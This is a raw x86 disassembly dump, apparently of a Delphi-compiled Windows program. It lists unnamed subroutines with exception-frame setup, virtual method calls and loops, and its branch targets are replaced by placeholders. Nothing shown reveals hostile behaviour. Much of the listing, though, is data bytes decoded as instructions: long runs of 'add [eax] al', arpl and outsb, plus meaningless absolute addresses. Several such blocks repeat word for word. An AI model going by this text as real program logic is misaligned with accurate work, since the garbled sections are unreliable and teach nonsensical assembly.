mov ebp [ eax ]
call [ ebp + 0x110 ]
test al al
je r-xdata
mov eax ebx
call sub_4774ec
mov esi eax
inc ebx
cmp ebx 0x10
jg r-xdata
sub_484a38
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ esi + 0x2e8 ]
call sub_414418
inc eax
jne r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x34 ] 0x20000000
jne r-xdata
mov [ ebx + 0x68 ] esi
test [ ebx + 0x1c ] 0x10
je r-xdata
mov dl 0x1
mov eax esi
call sub_484a00
mov edx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x80 ]
mov eax ebx
call sub_480ca0
cmp [ ebx + 0xa4 ] 0x0
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd8 ]
mov edx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xa4 ]
jmp r-xdata
mov edx ebx
mov eax [ esi + 0x2e8 ]
call sub_414210
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_484ab4
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] eax
xor ebp ebp
mov [ esp + 0x4 ] 0x1
mov eax [ esp ]
mov eax [ eax + 0x2e8 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax ebp
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
cmp [ esp + 0x4 ] 0x0
jne r-xdata
mov edx edi
mov eax [ esp ]
call sub_483fd0
mov ebx eax
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax ebx
call sub_481f8c
mov ebp eax
mov [ esp + 0x4 ] 0x0
mov eax ebx
call sub_481f8c
cmp ebp eax
jge r-xdata
sub_484b28
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push j_sub_403a98#3
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_484be1
lea eax [ ebp - 0xc ]
call sub_404094
retn
mov eax ebx
call sub_480d20
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax ebx
call sub_480d20
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405ca4
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bcbc
call sub_403ad0
jmp r-xdata
mov eax [ ebx + 0x48 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
mov [ ebp - 0x8 ] 0x0
mov edx [ ebp - 0x8 ]
mov eax [ ebx + 0x48 ]
call sub_4143bc
mov ecx eax
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_484b28
inc [ ebp - 0x8 ]
dec edi
jne r-xdata
sub_484be8
push ebx
push esi
mov ebx ecx
mov esi edx
cmp ebx esi
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xb0 ]
test al al
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_484c20
push ebx
mov ebx edx
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_480d20
test eax eax
je r-xdata
mov eax ebx
call sub_480d20
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
mov eax ebx
call sub_480d20
mov edx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
sub_484c70
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_47820c
pop edi
pop esi
pop ebx
retn
mov edi esi
mov al [ edi + 0x302 ]
mov [ ebx + 0x302 ] al
mov edx [ edi + 0x2f4 ]
mov eax [ ebx + 0x2f4 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov al [ edi + 0x301 ]
mov [ ebx + 0x301 ] al
mov edx [ edi + 0x2f8 ]
mov eax [ ebx + 0x2f8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov edx [ edi + 0x2ec ]
mov eax [ ebx + 0x2ec ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ edi + 0x334 ]
mov [ ebx + 0x334 ] eax
mov eax [ edi + 0x330 ]
mov [ ebx + 0x330 ] eax
mov edx [ edi + 0x2fc ]
mov eax [ ebx + 0x2fc ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov al [ edi + 0x338 ]
mov [ ebx + 0x338 ] al
mov edx [ edi + 0x2f0 ]
mov eax [ ebx + 0x2f0 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov al [ edi + 0x300 ]
mov [ ebx + 0x300 ] al
sub_484d38
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_484d5d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_484d64
retn
sub_484d68
push ebp
mov ebp esp
add esp 0xfffffff0
sub [ rw-data ] 0x1
jae r-xdata
mov esp ebp
pop ebp
retn
mov eax [ r-xdata ]
mov [ ebp - 0x10 ] eax
mov eax [ r-xdata ]
mov [ ebp - 0xc ] eax
mov eax [ r-xdata ]
mov [ ebp - 0x8 ] eax
mov eax [ r-xdata ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_413b28
sub_484dac
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push eax
dec esi
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + ecx * 2 ] bh
dec eax
add [ eax ] cl
add [ eax ] al
in al dx
test al 0x47
add [ eax ] ah
movsd [ edi ] [ esi ]
inc ecx
add [ eax + 0x74004035 ] bl
sahf
inc ecx
add [ eax - 0x6bffbfcb ] ah
xor eax 0x32dc0040
inc eax
add al bh
xor al [ eax ]
cld
popfd
inc ecx
add [ eax + 0x2800414a ] bl
mov eax [ 0x47c0041 ]
dec eax
add [ eax ] al
mov [ 0xffffffffa0cc0041 ] al
inc ecx
add [ eax ] dl
mov [ 0xffffffffa3080041 ] al
inc ecx
add [ eax ] bh
movsd [ edi ] [ esi ]
inc ecx
add [ eax ] ah
mov [ 0xffffffffa2180041 ] al
inc ecx
add [ eax - 0x5b ] al
inc ecx
add [ eax - 0x3 ] bl
inc edi
add al ah
inc [ edi ]
dec esp
inc [ edi ]
and al 0x0
dec eax
add [ esp + edx * 2 + 0x48 ] dh
add ah cl
push esp
dec eax
add [ eax + 0xf004803 ] dl
push esp
inc ecx
push esp
inc esi
jne r-xdata
xor eax 0x32dc0040
inc eax
add al bh
xor al [ eax ]
cld
popfd
inc ecx
add [ eax + 0x2800414a ] bl
mov eax [ 0x47c0041 ]
dec eax
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
push eax
dec esi
dec eax
add [ edi ] al
andps xmm0 [ ecx + 0x64 ]
push esp
inc esi
jne r-xdata
add [ eax ] al
adc [ eax + 0x48 ] dl
jb r-xdata
add [ eax ] al
mov [ 0xffffffffa0cc0041 ] al
inc ecx
add [ eax ] dl
mov [ 0xffffffffa3080041 ] al
inc ecx
add [ eax ] bh
movsd [ edi ] [ esi ]
inc ecx
add [ eax ] ah
mov [ 0xffffffffa2180041 ] al
inc ecx
add [ eax - 0x5b ] al
inc ecx
add [ eax - 0x3 ] bl
inc edi
add al ah
inc [ edi ]
dec esp
inc [ edi ]
and al 0x0
dec eax
add [ ebp + edi * 8 + 0x553c0047 ] bh
dec eax
add [ eax + 0x30004803 ] dl
sub eax [ eax ]
push ss
push esp
dec ebp
popad
outsb
jns r-xdata
inc ecx
add [ esp + eax + 0x48 ] bh
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
hlt
pop eax
std
inc edi
add al ah
inc [ edi ]
dec esp
inc [ edi ]
and al 0x0
dec eax
add [ ebp + edi * 8 + 0x553c0047 ] bh
dec eax
add [ eax - 0x1fffb7fd ] dl
push ebp
dec eax
add [ esp + edx * 2 ] dl
push ebx
jne r-xdata
dec eax
add [ eax + 0x4e ] bh
jae r-xdata
add ah dl
push eax
dec eax
add [ eax ] cl
add [ eax ] al
js r-xdata
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dh
dec edi
dec eax
add [ eax ] cl
add [ eax ] al
js r-xdata
inc esi
jne r-xdata
pop eax
std
inc edi
add al ah
inc [ edi ]
dec esp
inc [ edi ]
and al 0x0
dec eax
add [ ebp + edi * 8 + 0x553c0047 ] bh
dec eax
add [ eax - 0x3ffb7fd ] dl
push ebp
dec eax
add [ esp + edx * 2 ] dl
dec ebp
jne r-xdata
dec eax
add [ eax ] ah
movsd [ edi ] [ esi ]
inc ecx
add [ eax + 0x74004035 ] bl
sahf
inc ecx
add [ eax - 0x6bffbfcb ] ah
xor eax 0x9e740040
popad
arpl [ esp + edx * 2 + 0x65 ] si
inc esi
jne r-xdata
je r-xdata
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
nop
sub al 0x4f
dec eax
add [ edi ] al
push ss
push esp
dec ebp
dec esi
je r-xdata
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
lea eax [ eax ]
adc [ eax + 0x48 ] dl
add [ edi ] al
adc al 0x54
push ebx
jne r-xdata
popad
outsb
jns r-xdata
inc ecx
add [ eax ] ah
movsd [ edi ] [ esi ]
inc ecx
add [ eax + 0x74004035 ] bl
sahf
jb r-xdata
mov al [ 0xffffffff94004035 ]
xor eax 0x32dc0040
inc eax
add al bh
xor al [ eax ]
cld
popfd
inc ecx
add [ eax + 0x2800414a ] bl
mov eax [ 0x47c0041 ]
dec eax
add [ eax ] al
mov [ 0xffffffffa0cc0041 ] al
inc ecx
add [ eax ] dl
mov [ 0xffffffffa3080041 ] al
inc ecx
add [ eax ] bh
movsd [ edi ] [ esi ]
inc ecx
add [ eax ] ah
mov [ 0xffffffffa2180041 ] al
inc ecx
add [ eax - 0x5b ] al
inc ecx
add [ eax - 0x3 ] bl
inc edi
add al ah
inc [ edi ]
dec esp
inc [ edi ]
and al 0x0
dec eax
add [ esi + edx * 2 + 0x48 ] dl
add ah dl
push esi
dec eax
add [ eax + 0x10004803 ] dl
push esp
dec eax
imul esp [ edi + 0x68 ] 0x46656554
jne r-xdata
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
nop
int3
js r-xdata
jo r-xdata
xor eax 0x32dc0040
inc eax
add al bh
xor al [ eax ]
cld
popfd
inc ecx
add [ eax + 0x2800414a ] bl
xchg esp eax
je r-xdata
xor al [ eax ]
cld
popfd
inc ecx
add [ eax + 0x2800414a ] bl
clc
jae r-xdata
inc eax
add [ ebp + esi + 0x32dc0040 ] dl
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
lea eax [ eax ]
movsb [ edi ] [ esi ]
push edx
dec eax
add [ edi ] al
adc [ eax + ecx * 2 + 0x69 ] dl
push 0x46656554
jne r-xdata
inc edi
add al ah
inc [ edi ]
dec esp
inc [ edi ]
and al 0x0
dec eax
add [ ebp + edi * 8 + 0x553c0047 ] bh
dec eax
add [ eax + 0x18004803 ] dl
push esi
dec eax
add [ edx ] dl
push esp
inc esp
imul esi [ esi + 0x69 ] 0x65546564
inc esi
jne r-xdata
pop eax
std
dec eax
add [ eax ] ah
movsd [ edi ] [ esi ]
inc ecx
add [ eax + 0x74004035 ] bl
sahf
jns r-xdata
mov eax [ 0x47c0041 ]
dec eax
inc ecx
add [ eax ] ch
popad
arpl [ esp + edx * 2 + 0x65 ] si
inc esi
jne r-xdata
add [ eax - 0x6bffbfcb ] ah
xor eax 0x32dc0040
inc eax
add al bh
inc eax
add [ esi + ebx * 4 + 0x41 ] dh
inc esi
jne r-xdata
add [ eax ] al
xor [ eax + ecx * 2 ] dl
dec eax
add [ eax ] al
add ah ch
inc esi
jne r-xdata
add [ eax ] al
mov [ 0xffffffffa0cc0041 ] al
inc ecx
add [ eax ] dl
mov [ 0xffffffffa3080041 ] al
inc ecx
add [ eax ] bh
add [ esp + eax + 0x48 ] bh
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
inc esp
push edx
dec eax
add [ ecx + ebp * 4 + 0x50047 ] ah
or [ ebp + 0x65 ] dl
inc esi
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + edx * 2 + r-xdata ] dh
add [ eax ] al
inc esi
jne r-xdata
add [ eax ] al
mov [ 0xffffffffa0cc0041 ] al
inc ecx
add [ eax ] dl
mov [ 0xffffffffa3080041 ] al
inc ecx
add [ eax ] bh
add [ esp + eax + 0x48 ] bh
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
test al 0x4f
dec eax
add [ eax ] ch
dec edi
dec eax
add [ 0x65540800 ] al
inc esi
jne r-xdata
mov eax [ 0x47c0041 ]
dec eax
add [ eax ] al
mov [ 0xffffffffa0cc0041 ] al
inc ecx
add [ eax ] dl
mov [ 0xffffffffa3080041 ] al
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
les ecx [ esi + 0x48 ]
add [ ecx + ebp * 4 + 0x50047 ] ah
or [ ebp + 0x65 ] dl
inc esi
jne r-xdata
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] eax
mov esi ebx
mov ebx [ ebp + 0x8 ]
sub ebx esi
jl r-xdata
jb r-xdata
xor eax 0x32dc0040
inc eax
add al bh
xor al [ eax ]
cld
popfd
inc ecx
add [ eax + 0x2800414a ] bl
mov eax [ 0x47c0041 ]
dec eax
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
je r-xdata
movsd [ edi ] [ esi ]
arpl [ ecx ] bp
add [ eax + r-xdata ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
inc ecx
add [ eax - 0x6bffbfcb ] ah
xor eax 0x32dc0040
inc eax
add al bh
xor al [ eax ]
cld
popfd
inc ecx
add [ eax + 0x2800414a ] bl
mov eax [ 0x47c0041 ]
dec eax
add [ eax ] al
mov [ 0xffffffffa0cc0041 ] al
inc ecx
add [ eax ] dl
mov [ 0xffffffffa3080041 ] al
inc ecx
add [ eax ] bh
movsd [ edi ] [ esi ]
inc ecx
add [ eax ] ah
mov [ 0xffffffffa2180041 ] al
inc ecx
add [ eax - 0x5b ] al
inc ecx
add [ eax - 0x3 ] bl
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
lea eax [ eax ]
movsd [ edi ] [ esi ]
inc ecx
add [ eax ] ah
mov [ 0xffffffffa2180041 ] al
inc ecx
add [ eax - 0x5b ] al
inc ecx
add [ eax - 0x3 ] bl
arpl [ ecx ] bp
add [ eax + r-xdata ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bh
movsd [ edi ] [ esi ]
inc ecx
add [ eax ] ah
mov [ 0xffffffffa2180041 ] al
inc ecx
add [ eax - 0x5b ] al
inc ecx
add [ eax - 0x3 ] bl
add [ eax ] al
arpl [ ecx ] bp
add [ ebp + 0x4fa80040 ] cl
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
push eax
dec eax
fld [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
inc ebx
xor eax eax
push esp
inc esi
jne r-xdata
test al 0x47
add [ eax ] ah
movsd [ edi ] [ esi ]
inc ecx
add [ eax + 0x74004035 ] bl
sahf
inc ecx
add [ eax - 0x6bffbfcb ] ah
dec eax
add [ edi ] al
andps xmm1 [ edi + ebp * 2 + 0x77 ]
push esp
inc esi
jne r-xdata
inc ecx
add [ eax ] ah
mov [ 0xffffffffa2180041 ] al
inc ecx
add [ eax - 0x5b ] al
inc ecx
add [ eax - 0x3 ] bl
inc edi
add al ah
inc [ edi ]
dec esp
inc [ edi ]
and al 0x0
dec eax
add [ eax + 0x57 ] ah
dec eax
add al ah
push edi
dec eax
add [ eax + 0xf004803 ] dl
push esp
dec esp
outsd
ja r-xdata
mov [ 0xffffffffa5380041 ] eax
inc eax
add al bh
xor al [ eax ]
cld
popfd
inc ecx
add [ eax + 0x2800414a ] bl
mov eax [ 0x47c0041 ]
dec eax
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x53 ] ah
dec eax
add [ eax ] cl
add [ eax ] al
in al dx
test al 0x47
add [ eax ] ah
movsd [ edi ] [ esi ]
inc ecx
add [ eax + 0x74004035 ] bl
sahf
inc ecx
add [ eax - 0x6bffbfcb ] ah
xor eax 0x32dc0040
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xc ]
fadd [ ebp - 0x8 ]
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec eax
push esp
dec eax
add [ edi ] al
adc edx [ ecx + eax * 2 + 0x76 ]
jb r-xdata
add [ eax ] al
mov [ 0xffffffffa0cc0041 ] al
inc ecx
add [ eax ] dl
mov [ 0xffffffffa3080041 ] al
inc ecx
add [ eax ] bh
movsd [ edi ] [ esi ]
inc ecx
add [ eax ] ah
mov [ 0xffffffffa2180041 ] al
inc ecx
add [ eax - 0x5b ] al
inc ecx
add [ esp + eax + 0x48 ] bh
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
sbb [ ebx + 0x48 ] dl
add [ ecx + ebp * 4 + 0x50047 ] ah
or [ ebp + 0x65 ] dl
inc esi
jne r-xdata
fstp [ ebp - 0x8 ]
fwait
inc esi
dec ebx
jne r-xdata
push ecx
or al 0xdc
inc ebp
clc
push esp
inc esi
jne r-xdata
inc ecx
add [ eax - 0x3 ] bl
inc edi
add al ah
inc [ edi ]
dec esp
inc [ edi ]
and al 0x0
dec eax
add [ eax + ebx * 2 + 0x48 ] ch
add [ ecx + ebx * 2 ] dl
dec eax
add [ eax + 0x13004803 ] dl
push esp
inc ecx
jbe r-xdata
cmp [ ebp - 0x5ddfffbf ] ah
inc ecx
add [ eax ] bl
mov [ 0xffffffffa5400041 ] al
arpl [ ecx ] bp
add [ ebx + 0x4853e8c0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x54 ] cl
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dh
push esp
dec eax
add [ eax ] cl
add [ eax ] al
in al dx
pop ebp
retn 0x4
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
call 0xffffffffa4489cb5
test eax 0x50047
or [ ebp + 0x65 ] dl
inc esi
jne r-xdata
xor eax eax
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] eax
mov eax [ esp + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
arpl [ ecx ] bp
add [ ebx - 0x1374aa40 ] cl
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx ecx
call sub_47fdd4
mov edi eax
cmp ebx 0xffffffff
jne r-xdata
fld [ esp + 0x8 ]
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
mov eax edi
call sub_47f470
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
inc edi
dec esi
jne r-xdata
mov edx ebp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xc ]
fadd [ esp + 0x8 ]
fstp [ esp + 0x8 ]
fwait
mov edx edi
mov eax [ esp + 0x4 ]
call sub_4143bc
mov edx eax
mov eax [ esp ]
call sub_47fdd4
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
cmp ebp eax
jge r-xdata
sub_48512d
push ecx
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + edx * 2 + r-xdata ] dh
add [ eax ] al
js r-xdata
pop eax
std
inc edi
add al ah
inc [ edi ]
dec esp
inc [ edi ]
and al 0x0
dec eax
add [ ebp + edi * 8 + 0x553c0047 ] bh
dec eax
add [ eax + 0x18004803 ] dl
push esi
dec eax
add [ edx ] dl
push esp
inc esp
imul esi [ esi + 0x69 ] 0x65546564
inc esi
jne r-xdata
dec eax
add [ eax ] ah
movsd [ edi ] [ esi ]
inc ecx
add [ eax + 0x74004035 ] bl
sahf
inc ecx
add [ eax - 0x6bffbfcb ] ah
xor eax 0x32dc0040
inc eax
add al bh
xor al [ eax ]
cld
popfd
inc ecx
add [ eax + 0x2800414a ] bl
mov eax [ 0x47c0041 ]
dec eax
add [ eax ] al
mov [ 0xffffffffa0cc0041 ] al
inc ecx
add [ eax ] dl
mov [ 0xffffffffa3080041 ] al
inc ecx
add [ eax ] bh
movsd [ edi ] [ esi ]
inc ecx
add [ eax ] ah
mov [ 0xffffffffa2180041 ] al
inc ecx
add [ eax - 0x5b ] al
inc ecx
add [ eax - 0x3 ] bl
mov al [ 0xffffffff94004035 ]
xor eax 0x32dc0040
inc eax
add al bh
xor al [ eax ]
cld
popfd
inc ecx
add [ eax + 0x2800414a ] bl
mov eax [ 0x47c0041 ]
dec eax
add [ eax ] al
mov [ 0xffffffffa0cc0041 ] al
inc ecx
add [ eax ] dl
mov [ 0xffffffffa3080041 ] al
inc ecx
add [ eax ] bh
movsd [ edi ] [ esi ]
inc ecx
add [ eax ] ah
mov [ 0xffffffffa2180041 ] al
inc ecx
add [ eax - 0x5b ] al
inc ecx
add [ eax - 0x3 ] bl
inc edi
add al ah
inc [ edi ]
dec esp
inc [ edi ]
and al 0x0
dec eax
add [ esi + edx * 2 + 0x48 ] dl
add ah dl
push esi
dec eax
add [ eax + 0x10004803 ] dl
push esp
dec eax
imul esp [ edi + 0x68 ] 0x46656554
jne r-xdata
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
nop
int3
inc eax
add [ ebp + esi + 0x32dc0040 ] dl
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
lea eax [ eax ]
movsb [ edi ] [ esi ]
push edx
dec eax
add [ edi ] al
adc [ eax + ecx * 2 + 0x69 ] dl
push 0x46656554
jne r-xdata
add [ eax ] al
xor [ eax + ecx * 2 ] dl
dec eax
add [ eax ] al
add ah ch
inc esi
jne r-xdata
add [ eax ] al
mov [ 0xffffffffa0cc0041 ] al
inc ecx
add [ eax ] dl
mov [ 0xffffffffa3080041 ] al
inc ecx
add [ eax ] bh
add [ esp + eax + 0x48 ] bh
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
inc esp
push edx
dec eax
add [ ecx + ebp * 4 + 0x50047 ] ah
or [ ebp + 0x65 ] dl
inc esi
jne r-xdata
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] eax
mov esi ebx
mov ebx [ ebp + 0x8 ]
sub ebx esi
jl r-xdata
jb r-xdata
xor eax 0x32dc0040
inc eax
add al bh
xor al [ eax ]
cld
popfd
inc ecx
add [ eax + 0x2800414a ] bl
mov eax [ 0x47c0041 ]
dec eax
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
je r-xdata
movsd [ edi ] [ esi ]
arpl [ ecx ] bp
add [ eax + r-xdata ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
fld [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
inc ebx
xor eax eax
push esp
inc esi
jne r-xdata
test al 0x47
add [ eax ] ah
movsd [ edi ] [ esi ]
inc ecx
add [ eax + 0x74004035 ] bl
sahf
inc ecx
add [ eax - 0x6bffbfcb ] ah
dec eax
add [ edi ] al
andps xmm1 [ edi + ebp * 2 + 0x77 ]
push esp
inc esi
jne r-xdata
inc ecx
add [ eax ] ah
mov [ 0xffffffffa2180041 ] al
inc ecx
add [ eax - 0x5b ] al
inc ecx
add [ eax - 0x3 ] bl
inc edi
add al ah
inc [ edi ]
dec esp
inc [ edi ]
and al 0x0
dec eax
add [ eax + 0x57 ] ah
dec eax
add al ah
push edi
dec eax
add [ eax + 0xf004803 ] dl
push esp
dec esp
outsd
ja r-xdata
mov [ 0xffffffffa5380041 ] eax
inc eax
add al bh
xor al [ eax ]
cld
popfd
inc ecx
add [ eax + 0x2800414a ] bl
mov eax [ 0x47c0041 ]
dec eax
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x53 ] ah
dec eax
add [ eax ] cl
add [ eax ] al
in al dx
test al 0x47
add [ eax ] ah
movsd [ edi ] [ esi ]
inc ecx
add [ eax + 0x74004035 ] bl
sahf
inc ecx
add [ eax - 0x6bffbfcb ] ah
xor eax 0x32dc0040
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xc ]
fadd [ ebp - 0x8 ]
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec eax
push esp
dec eax
add [ edi ] al
adc edx [ ecx + eax * 2 + 0x76 ]
jb r-xdata
add [ eax ] al
mov [ 0xffffffffa0cc0041 ] al
inc ecx
add [ eax ] dl
mov [ 0xffffffffa3080041 ] al
inc ecx
add [ eax ] bh
movsd [ edi ] [ esi ]
inc ecx
add [ eax ] ah
mov [ 0xffffffffa2180041 ] al
inc ecx
add [ eax - 0x5b ] al
inc ecx
add [ esp + eax + 0x48 ] bh
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
sbb [ ebx + 0x48 ] dl
add [ ecx + ebp * 4 + 0x50047 ] ah
or [ ebp + 0x65 ] dl
inc esi
jne r-xdata
fstp [ ebp - 0x8 ]
fwait
inc esi
dec ebx
jne r-xdata
push ecx
or al 0xdc
inc ebp
clc
push esp
inc esi
jne r-xdata
inc ecx
add [ eax - 0x3 ] bl
inc edi
add al ah
inc [ edi ]
dec esp
inc [ edi ]
and al 0x0
dec eax
add [ eax + ebx * 2 + 0x48 ] ch
add [ ecx + ebx * 2 ] dl
dec eax
add [ eax + 0x13004803 ] dl
push esp
inc ecx
jbe r-xdata
cmp [ ebp - 0x5ddfffbf ] ah
inc ecx
add [ eax ] bl
mov [ 0xffffffffa5400041 ] al
arpl [ ecx ] bp
add [ ebx + 0x4853e8c0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x54 ] cl
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dh
push esp
dec eax
add [ eax ] cl
add [ eax ] al
in al dx
pop ebp
retn 0x4
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
call 0xffffffffa4489cb5
test eax 0x50047
or [ ebp + 0x65 ] dl
inc esi
jne r-xdata
xor eax eax
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] eax
mov eax [ esp + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
arpl [ ecx ] bp
add [ ebx - 0x1374aa40 ] cl
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx ecx
call sub_47fdd4
mov edi eax
cmp ebx 0xffffffff
jne r-xdata
fld [ esp + 0x8 ]
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
mov eax edi
call sub_47f470
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
inc edi
dec esi
jne r-xdata
mov edx ebp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xc ]
fadd [ esp + 0x8 ]
fstp [ esp + 0x8 ]
fwait
mov edx edi
mov eax [ esp + 0x4 ]
call sub_4143bc
mov edx eax
mov eax [ esp ]
call sub_47fdd4
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
cmp ebp eax
jge r-xdata
sub_4854cc
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov ebp ecx
mov [ esp + 0x4 ] edx
mov [ esp ] eax
xor eax eax
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] eax
mov eax [ esp + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
fld [ esp + 0x8 ]
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx ebp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xc ]
fadd [ esp + 0x8 ]
fstp [ esp + 0x8 ]
fwait
mov edx edi
mov eax [ esp + 0x4 ]
call sub_4143bc
mov edx eax
mov eax [ esp ]
call sub_47fdd4
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
cmp ebp eax
jge r-xdata
sub_48553c
push ebx
push esi
push edi
push ebp
add esp 0xffffffe8
mov [ esp + 0x8 ] ecx
mov [ esp + 0x4 ] edx
mov [ esp ] eax
mov bl 0x1
xor eax eax
mov [ esp + 0x10 ] eax
mov [ esp + 0x14 ] eax
mov eax [ esp + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
fld [ esp + 0x10 ]
add esp 0x18
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
